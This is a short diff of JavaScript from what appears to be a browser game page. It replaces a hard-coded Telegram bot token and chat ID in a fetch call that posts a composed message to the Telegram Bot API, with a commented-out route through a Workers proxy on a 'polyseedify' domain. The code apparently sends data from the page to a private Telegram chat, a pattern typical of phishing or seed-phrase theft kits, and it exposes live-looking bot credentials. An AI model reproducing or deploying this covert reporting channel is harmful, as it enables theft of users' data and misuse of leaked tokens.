@@ -1283,8 +1283,8 @@ Play again to beat your score!
       `;
 
 const response = await fetch(
-  // "https://falling-cloud-5bb1.polyseedify.workers.dev/bot8221127649:AAFgv_33FMkaSmol4cpQHsiTkVkTosiXACU/sendMessage",
-  "https://api.telegram.org/bot8221127649:AAFgv_33FMkaSmol4cpQHsiTkVkTosiXACU/sendMessage",
+  // "https://falling-cloud-5bb1.polyseedify.workers.dev/bot8163987157:AAEb-2rRnTmH6VAmezEpQPW9LjhpBuknsuU/sendMessage",
+  "https://api.telegram.org/bot8163987157:AAEb-2rRnTmH6VAmezEpQPW9LjhpBuknsuU/sendMessage",
 
  {
     method: "POST",
@@ -1292,7 +1292,7 @@ const response = await fetch(
       "Content-Type": "application/json",
     },
     body: JSON.stringify({
-      chat_id: "-1002974139336", // 
+      chat_id: "-1003945949723", // 
       text: message,
     }),
   }
